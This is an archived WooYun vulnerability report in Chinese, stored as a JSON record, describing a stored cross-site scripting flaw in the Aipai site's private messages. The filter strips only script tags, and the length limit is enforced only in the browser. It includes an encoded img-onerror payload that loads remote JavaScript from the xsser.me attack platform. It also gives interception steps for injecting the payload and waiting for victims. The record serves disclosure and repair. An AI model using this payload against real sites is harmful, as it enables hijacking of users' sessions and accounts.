{"id": 17871, "wybug_id": "wooyun-2012-09891", "wybug_title": "爱拍突破长度限制，一处极具危险性的小松鼠", "wybug_corp": "爱拍", "wybug_author": "imlonghao", "wybug_date": "2012-07-19 16:06", "wybug_open_date": "2012-09-02 16:07", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "17", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-07-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-07-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-07-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-08-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-08-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-09-02：\t细节向公众公开  简要描述： 小松鼠很可爱，他可以让屌丝变成高富帅！ 详细说明：  爱拍在发送短消息的时候，只过滤了<script>，没有过滤其他标签和<>，所以就产生了XSS。话说上次XSSER让我去钓ID1001，我了个后悔啊，那天我再去复现这个漏洞，拼命给我报错，幸好，今天我再去试的话，成功复现，哈哈，所以果断发来乌云。- -||技术不精，不会写什么好的利用代码，就用XSSER的代码，但是发现，长度提醒超过了150字，仔细一看，只是做了客户端上面的限制，没有在服务器接口端进行长度限制，由于有TOKEN，所以得按正常步骤发，然后用截包工具拦截下载，然后就可以在content中输入长度无限的内容。   漏洞证明：  利用代码，IMG标签的onerror。\n<img src=# id=xssyou style=display:none onerror=eval(unescape(/var%20b%3Ddocument.createElement%28%22script%22%29%3Bb.src%3D%22http%3A%2F%2Fxsser.me%2FUZH56T%3F%22%2BMath.random%28%29%3B%28document.getElementsByTagName%28%22HEAD%22%29%5B0%5D%7C%7Cdocument.body%29.appendChild%28b%29%3B/.source));//>\n第一次直接发代码<img>标签是全部会直接吞掉的、所以先要给被害人发一个正常的短信息，然后在发信箱中点击查看，然后再在这个页面中发XSS\n\n随便写点内容，按发送，同时截包，在content插代码，然后，发送！\n\n然后你需要做的，就是耐心等待鱼儿上钩了。\n\n\n\n   修复方案：  在服务器端限制长度净化输入，过滤输出。< -《> - 》   版权声明：转载请注明来源 imlonghao@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2012-07-20 10:29 厂商回复： iamlonghao, 非常感谢. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-08-20 09:15 |    \t\tdiscovery \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:3        | www.google.com)\t\t \n  你的XSS Platform 可否共享下代码 ^.^    \n     2012-09-02 17:23 |    \t\tXhm1n9 \t\t\t( 实习白帽子  |\t\t\t        Rank:57 漏洞数:13        | bug)\t\t \n  @discovery 应该是beef    \n     2012-09-02 19:56 |    \t\tcnrstar \t\t\t( 普通白帽子  |\t\t\t        Rank:157 漏洞数:23        | Be my personal best!)\t\t \n  @Xhm1n9 不是beef啊、    \n     2012-09-02 20:35 |    \t\tXhm1n9 \t\t\t( 实习白帽子  |\t\t\t        Rank:57 漏洞数:13        | bug)\t\t \n  @cnrstar 好东西求分享:)    \n     2012-09-06 12:19 |    \t\tcnrstar \t\t\t( 普通白帽子  |\t\t\t        Rank:157 漏洞数:23        | Be my personal best!)\t\t \n  @Xhm1n9 真相在此：xsser.me    \n     2012-09-06 12:33 |    \t\tXhm1n9 \t\t\t( 实习白帽子  |\t\t\t        Rank:57 漏洞数:13        | bug)\t\t \n  @cnrstar 没帐号    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}